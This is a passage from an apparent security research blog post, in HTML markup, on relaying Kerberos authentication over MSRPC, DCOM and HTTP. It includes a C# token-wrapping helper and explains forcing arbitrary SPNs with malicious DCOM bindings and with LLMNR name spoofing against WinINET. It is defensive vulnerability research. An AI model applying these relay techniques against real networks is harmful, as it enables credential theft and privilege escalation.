class="c6 c2"&gt;)(length &amp;amp; 0xFF) };&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;throw&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;ArgumentException(&lt;/span&gt;&lt;span class="c2 c36"&gt;&amp;quot;Invalid length&amp;quot;&lt;/span&gt;&lt;span class="c6 c2"&gt;, nameof(length));&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c6 c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c7 c9"&gt;&lt;span class="c6 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2 c13"&gt;public&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;static&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c2"&gt;[] ConvertApReq(&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c6 c2"&gt;[] token)&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c6 c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;if&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;(token.Length == 0 || token[0] != 0x6E)&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;return&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;token;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; MemoryStream stm = &lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;MemoryStream();&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; BinaryWriter writer = &lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;BinaryWriter(stm);&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; Console.WriteLine(&lt;/span&gt;&lt;span class="c2 c36"&gt;&amp;quot;Converting DCE AP_REQ to GSS-API format.&amp;quot;&lt;/span&gt;&lt;span class="c6 c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c2"&gt;[] header = &lt;/span&gt;&lt;span class="c2 c13"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c6 c2"&gt;[] { 0x06, 0x09, 0x2a, 0x86, 0x48, &lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c6 c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0x86, 0xf7, 0x12, 0x01, 0x02, 0x02, 0x01, 0x00 };&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; writer.Write((&lt;/span&gt;&lt;span class="c2 c13"&gt;byte&lt;/span&gt;&lt;span class="c6 c2"&gt;)0x60);&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c6 c2"&gt;&amp;nbsp; &amp;nbsp; writer.Write(EncodeLength(header.Length + token.Length));&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c6 c2"&gt;&amp;nbsp; &amp;nbsp; writer.Write(header);&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c6 c2"&gt;&amp;nbsp; &amp;nbsp; writer.Write(token);&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c2 c13"&gt;return&lt;/span&gt;&lt;span class="c6 c2"&gt;&amp;nbsp;stm.ToArray();&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Subsequent tokens in the authentication process don&amp;#39;t need to be wrapped; in fact, wrapping them with their GSS-API headers will cause the authentication to fail. Relaying MSRPC requests would probably be difficult just due to the relative lack of clients which request the server&amp;#39;s SPN. Also when the SPN is requested it tends to be a conscious act of securing the client and so best practice tends to require the developer to set the maximum authentication level, making the Kerberos AP_REQ less useful.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.pn61xux6i1ia"&gt;&lt;span class="c6 c19"&gt;DCOM&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;The DCOM protocol uses MSRPC under the hood to access remote COM objects, therefore it should have the same behavior as MSRPC. The big difference is DCOM is designed to automatically handle the authentication requirements of a remote COM object through binding information contained in the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/7fe8200b-dccd-48cf-a2fa-681e3e0a23f4"&gt;DUALSTRINGARRAY&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;returned during &lt;/span&gt;&lt;span class="c4"&gt;Object Exporter ID (OXID)&lt;/span&gt;&lt;span&gt;&amp;nbsp;resolving. Therefore the client doesn&amp;#39;t need to explicitly call &lt;/span&gt;&lt;span class="c4"&gt;RpcBindingSetAuthInfo &lt;/span&gt;&lt;span class="c3"&gt;to configure the authentication.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The binding information contains the protocol sequence and endpoint to use (such as TCP on port 30000) as well as the security bindings. Each security binding contains the RPC authentication service (&lt;/span&gt;&lt;span class="c4"&gt;wAuthnSvc&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the below screenshot) to use as well as an optional SPN (&lt;/span&gt;&lt;span class="c4"&gt;aPrincName&lt;/span&gt;&lt;span&gt;) for the authentication. Therefore a malicious DCOM server can force the client to use the &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_GSS_KERBEROS&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;authentication service with a completely arbitrary SPN by returning an appropriate security binding.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c14 c4 c25"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEiN78ReCzU5wVJ3qCozRJ2MSkKX4-Bm_S0zDSU2TNs6BrYoBffMIr7WZuL4AiNiO8rbVWrTkdGwjp6S2yyQptBIh82kWiKNOU-ziSntZpjGETP1TfIvXYzKFQyyW9C_qMEyoM3c1-7tdoqNLWxh2RYuq1pgbBFAtUCTjyQZzrU1h7mOxFnAl2l1PQBEuw=s1372" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEiN78ReCzU5wVJ3qCozRJ2MSkKX4-Bm_S0zDSU2TNs6BrYoBffMIr7WZuL4AiNiO8rbVWrTkdGwjp6S2yyQptBIh82kWiKNOU-ziSntZpjGETP1TfIvXYzKFQyyW9C_qMEyoM3c1-7tdoqNLWxh2RYuq1pgbBFAtUCTjyQZzrU1h7mOxFnAl2l1PQBEuw=s1372" border="0" alt="Screenshot of part of the MS-DCOM protocol documentation showing the SECURITYBINDING structure" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c25 c14 c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The authentication level chosen by the client depends on the value of the &lt;/span&gt;&lt;span class="c4"&gt;dwAuthnLevel&lt;/span&gt;&lt;span&gt;&amp;nbsp;parameter specified if the COM client calls the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity"&gt;CoInitializeSecurity&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If the client doesn&amp;#39;t explicitly call &lt;/span&gt;&lt;span class="c4"&gt;CoInitializeSecurity&lt;/span&gt;&lt;span&gt;&amp;nbsp;then a default will be used which &lt;/span&gt;&lt;span&gt;is currently &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_CONNECT.&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;This means neither integrity or confidentiality will be enforced on the Kerberos AP_REQ by default.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;One limitation is that without a call to &lt;/span&gt;&lt;span class="c4"&gt;CoInitializeSecurity, &lt;/span&gt;&lt;span&gt;the default impersonation level for the client is set to &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_IMP_LEVEL_IDENTIFY&lt;/span&gt;&lt;span&gt;. This means the access token generated by the DCOM RPC authentication can only be used for identification and not for impersonation. For some services this isn&amp;#39;t an issue, for example LDAP doesn&amp;#39;t need an impersonation level token. However for others such as SMB this would prevent access to files. It&amp;#39;s possible that you could find a COM client which sets both &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_AUTHN_LEVEL_CONNECT &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span class="c4"&gt;RPC_C_IMP_LEVEL_IMPERSONATE&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;though there&amp;#39;s no trivial process to assess that.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;Getting a client to connect to the server isn&amp;#39;t trivial as DCOM isn&amp;#39;t a widely used protocol on modern Windows networks due to high authentication requirements. However, one use case for this is local privilege escalation. For example you could get a privileged service to connect to the malicious COM server and relay the computer account Kerberos AP_REQ which is generated. I have a working PoC for this which allows a local non-admin user to connect to the domain&amp;#39;s LDAP server using the local computer&amp;#39;s credentials. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;This attack is somewhat similar to the &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://github.com/antonioCoco/RemotePotato0"&gt;RemotePotato&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;attack (which uses NTLM rather than Kerberos) which again Microsoft have refused to fix. I&amp;#39;ll describe this in more detail in a separate &lt;/span&gt;&lt;span&gt;blog post after this one&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.hn66nwtnflze"&gt;&lt;span class="c6 c19"&gt;HTTP&lt;/span&gt;&lt;/h2&gt; &lt;p class="c0"&gt;&lt;span&gt;HTTP has supported &lt;/span&gt;&lt;span class="c4"&gt;NTLM&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;authentication for a long time (see &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://datatracker.ietf.org/doc/html/draft-brezak-spnego-http-04"&gt;this draft&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from 2002 although the most recent RFC is &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4559"&gt;4559&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from 2006). To initiate a Windows authentication session the server can respond to a request with the status code 401 and specify a &lt;/span&gt;&lt;span class="c4"&gt;WWW-Authenticate&lt;/span&gt;&lt;span&gt;&amp;nbsp;header with the value &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;. If the client supports Windows authentication it can use &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span&gt;&amp;nbsp;to generate a token, convert the binary token into a Base64 string and send it in the next request to the server with the &lt;/span&gt;&lt;span class="c4"&gt;Authorization&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;header. This process is repeated until the client errors or the authentication succeeds.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;In theory only &lt;/span&gt;&lt;span class="c4"&gt;NTLM&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;Negotiate&lt;/span&gt;&lt;span&gt;&amp;nbsp;are defined but a HTTP implementation could use other Windows authentication packages such as &lt;/span&gt;&lt;span class="c4"&gt;Kerberos &lt;/span&gt;&lt;span class="c3"&gt;if it so chose to. Whether the HTTP client will automatically use the user&amp;#39;s credentials is up to the user agent or the developer using it as a library.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;All the major browsers support both authentication types as well as many non browser HTTP user agents such as those in .NET and WinHTTP. I looked at the following implementations, all running on Windows 10 21H1:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c24 lst-kix_fmj6vk2ylkib-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;WinINET (Internet Explorer 11)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;WinHTTP (WebClient)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;Chromium M93 (Chrome and Edge)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;Firefox 91&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;.NET Framework 4.8&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c0 c18 li-bullet-0"&gt;&lt;span class="c3"&gt;.NET 5.0 and 6.0&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;This is of course not an exhaustive list, and there&amp;#39;s likely to be many different HTTP clients in Windows which might have different behaviors. I&amp;#39;ve also not looked at how non-Windows clients work in this regard. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;There&amp;#39;s two important behaviors that I wanted to assess with HTTP. First is how the user agent determines when to perform automatic Windows authentication using the current user&amp;#39;s credentials. In order to relay the authentication it can&amp;#39;t ask the user for their credentials. And second we want to know how the SPN is selected by the user agent when calling &lt;/span&gt;&lt;span class="c4"&gt;InitializeSecurityContext&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c32" id="h.7drfeuxw9d9q"&gt;&lt;span class="c31"&gt;WinINET (Internet Explorer 11)&lt;/span&gt;&lt;/h3&gt; &lt;p class="c0"&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/wininet/portal"&gt;WinINET&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be used as a generic library to handle HTTP connections and authentication. There&amp;#39;s likely many different users of WinINET but we&amp;#39;ll just look at Internet Explorer 11 as that is what it&amp;#39;s most known for. WinINET is also the originator of HTTP &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span&gt;authentication&lt;/span&gt;&lt;span class="c3"&gt;, so it&amp;#39;s good to get a baseline of what WinINET does in case other libraries just copied its behavior.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;First, how does WinINET determine when it should handle Windows authentication automatically? By default this is based on whether the target host is considered to be in the Intranet Zone. This means any host which bypasses the configured HTTP proxy or uses an undotted name will be considered Intranet zone and WinINET will automatically authenticate using the current user&amp;#39;s credentials.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;It&amp;#39;s possible to disable this behavior by changing the security options for the Intranet Zone to &amp;quot;Prompt for &lt;/span&gt;&lt;span&gt;user name&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;and password&amp;quot;, as shown below:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEi0PEBYNeQYyCFc_m0LHSgoGRsniCGYJYWXZuD4Ix1SXwSklWAhLmMg5NknUrJ7q4jAjDVhx0raXfmQXk9a3TPvJqUKT0pdcyNnv2h9KzFrhdJzQGmoHRFCCUhRfp0RexYbR9hkmu3SnPy5sBKjgUMsv5gZFka1gAv7evU_d5E7iQOPegQCv4c8360SmQ=s699" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEi0PEBYNeQYyCFc_m0LHSgoGRsniCGYJYWXZuD4Ix1SXwSklWAhLmMg5NknUrJ7q4jAjDVhx0raXfmQXk9a3TPvJqUKT0pdcyNnv2h9KzFrhdJzQGmoHRFCCUhRfp0RexYbR9hkmu3SnPy5sBKjgUMsv5gZFka1gAv7evU_d5E7iQOPegQCv4c8360SmQ=s699" border="0" alt="Screenshot of the system Internet Options Security Settings showing how to disable automatic authentication" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Next, how does WinINET determine the SPN to use for &lt;/span&gt;&lt;span class="c4"&gt;Negotiate &lt;/span&gt;&lt;span class="c3"&gt;authentication? RFC4559 says the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c25 c14 c4"&gt;&amp;#39;When the Kerberos Version 5 GSSAPI mechanism [RFC4121] is being used, the HTTP server will be using a principal name of the form of &amp;quot;HTTP/hostname&amp;quot;&amp;#39;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;You might assume therefore that the HTTP URL that WinINET is connecting to would be sufficient to build the SPN: just use the hostname as provided and combine with the HTTP service class. However it turns out that&amp;#39;s not entirely the case. I found a rough description of how IE and WinINET actually generate the SPN in &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/internet-explorer-behaviors-with-kerberos-authentication/ba-p/396428"&gt;this blog&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span&gt;This blog post is over 10 years old so it was possible that things have changed, however it turns out to not be the case&lt;/span&gt;&lt;span class="c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;The basic approach is that WinINET doesn&amp;#39;t necessarily trust the hostname specified in the HTTP URL. Instead it requests the canonical name of the server via DNS. It doesn&amp;#39;t seem to explicitly request a CNAME record from the DNS server. Instead it calls &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo"&gt;getaddrinfo&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;and specifies the &lt;/span&gt;&lt;span class="c4"&gt;AI_CANONNAME&lt;/span&gt;&lt;span&gt;&amp;nbsp;hint. Then it uses the returned value of &lt;/span&gt;&lt;span class="c4"&gt;ai_canonname&lt;/span&gt;&lt;span&gt;&amp;nbsp;and prefixes it with the &lt;/span&gt;&lt;span class="c4"&gt;HTTP&lt;/span&gt;&lt;span&gt;&amp;nbsp;service class&lt;/span&gt;&lt;span&gt;. In general &lt;/span&gt;&lt;span class="c4"&gt;ai_canonname&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;is the name provided by the DNS server in the returned A/AAAA record.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;For example, if the HTTP URL is &lt;/span&gt;&lt;span class="c4"&gt;http://fileserver.domain.com&lt;/span&gt;&lt;span&gt;, but the DNS A record contains the canonical name &lt;/span&gt;&lt;span class="c4"&gt;example.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;the generated SPN is &lt;/span&gt;&lt;span class="c4"&gt;HTTP/example.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;and not &lt;/span&gt;&lt;span class="c4"&gt;HTTP/fileserver.domain.com&lt;/span&gt;&lt;span class="c3"&gt;. Therefore to provide an arbitrary SPN you need to get the name in the DNS address record to differ from the IP address in that record so that IE will connect to a server we control while generating Kerberos authentication for a different target name.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;The most obvious technique would be to specify a DNS CNAME record which redirects to another hostname. However, at least if the client is using a Microsoft DNS server (which is likely for a domain environment) then the CNAME record is not directly returned to the client. Instead the DNS server will perform a recursive lookup, and then return the CNAME along with the validated address record to the client. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Therefore, if an attacker sets up a CNAME record for &lt;/span&gt;&lt;span class="c4"&gt;www.evil.com&lt;/span&gt;&lt;span&gt;, which redirects to &lt;/span&gt;&lt;span class="c4"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;the DNS server will return the CNAME record and an address record for the real IP address of &lt;/span&gt;&lt;span class="c4"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;. WinINET will try to connect to the HTTP service on &lt;/span&gt;&lt;span class="c4"&gt;fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than &lt;/span&gt;&lt;span class="c4"&gt;www.evil.com&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;which is what is needed for the attack to function.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;I tried various ways of tricking the DNS client into making a direct request to a DNS server I controlled but I couldn&amp;#39;t seem to get it to work. However, it turns out there is a way to get the DNS resolver to accept arbitrary DNS responses, via local DNS resolution protocols such as &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://datatracker.ietf.org/doc/html/rfc6762"&gt;Multicast DNS (MDNS)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://datatracker.ietf.org/doc/html/rfc4795"&gt;Link-Local Multicast Name Resolution (LLMNR)&lt;/a&gt;&lt;/span&gt;&lt;span class="c3"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;These two protocols use a lightly modified DNS packet structure, so you can return a response to the name resolution request with an address record with the IP address of the malicious web server, but the canonical name of any server. WinINET will then make the HTTP connection to the malicious web server but construct the SPN for the spoofed canonical name. I&amp;#39;ve verified this with LLMNR and in theory MDNS should work as well.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Is spoofing the canonical name a bug in the Windows DNS client resolver? I don&amp;#39;t believe any DNS protocol requires the query name to exactly match the answer name. If the DNS server has a CNAME record for the queried host then there&amp;#39;s no obvious requirement for it to return that record when it could just return the address record. Of course if a public DNS server could spoof a host for a DNS zone which it didn&amp;#39;t control, that&amp;#39;d be a &lt;/span&gt;&lt;span class="c8"&gt;&lt;a class="c51" href="https://www.cs.cornell.edu/~shmat/shmat_securecomm10.pdf"&gt;serious security issue&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. It&amp;#39;s also worth noting that this doesn&amp;#39;t spoof the name generally. As the cached DNS entry on Windows is based on the query name, if the client now resolves &lt;/span&gt;&lt;span class="c4"&gt;fileserver.domain.com&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;a new DNS request will be made and the DNS server would return the real address.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span&gt;Attacking local name resolution protocols is a well known weakness abused for MitM attacks, so it&amp;#39;s likely that some security conscious networks will disable the protocols. However, the advantage of using LLMNR this way over its use for MitM is that the resolved name can be anything. As in, normally you&amp;#39;d want to spoof the DNS name of an existing host, in our example you&amp;#39;d spoof the request for the &lt;/span&gt;&lt;span class="c4"&gt;fileserver&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;name. But for registered computers on the network the DNS client will usually satisfy the name resolution via the network&amp;#39;s DNS server before ever trying local DNS resolution. Therefore local DNS resolution would never be triggered and it wouldn&amp;#39;t be possible to spoof it. For relaying Kerberos authentication we don&amp;#39;t care, you can induce a client to connect to an unregistered host name which will fallback to local DNS resolution.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c3"&gt;The big problem with the local DNS resolution attack vector is that the attacker must be in the same multicast domain as the victim computer. However, the attacker can still start the process by getting a user to connect to an external domain which looks legitimate then redirect to an undotted name to both force automatic authentication and local DNS resolving.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEjm2PtQTZlQobqpEmVuy_72dJbu90cytEZH8jKN3ZwLkCzOMKQa0Rwfk0FVqKaPu5fyDimYp_gWkAxJHjdZU45OIVRD3EiPE_sd1jEmTCTLtPgMz96bHOM6SQrTPx7OJt3A3O65vdC1lRtF3y8pKchdwcst1J7oJCMIFb_PMGOcvy9CFEKz6Y3vbMTZ9g=s877" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEjm2PtQTZlQobqpEmVuy_72dJbu90cytEZH8jKN3ZwLkCzOMKQa0Rwfk0FVqKaPu5fyDimYp_gWkAxJHjdZU45OIVRD3EiPE_sd1jEmTCTLtPgMz96bHOM6SQrTPx7OJt3A3O65vdC1lRtF3y8pKchdwcst1J7oJCMIFb_PMGOcvy9CFEKz6Y3vbMTZ9g=s877" border="0" alt="Diagram of the local DNS resolving attack against WinINET" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c9"&gt;&lt;span 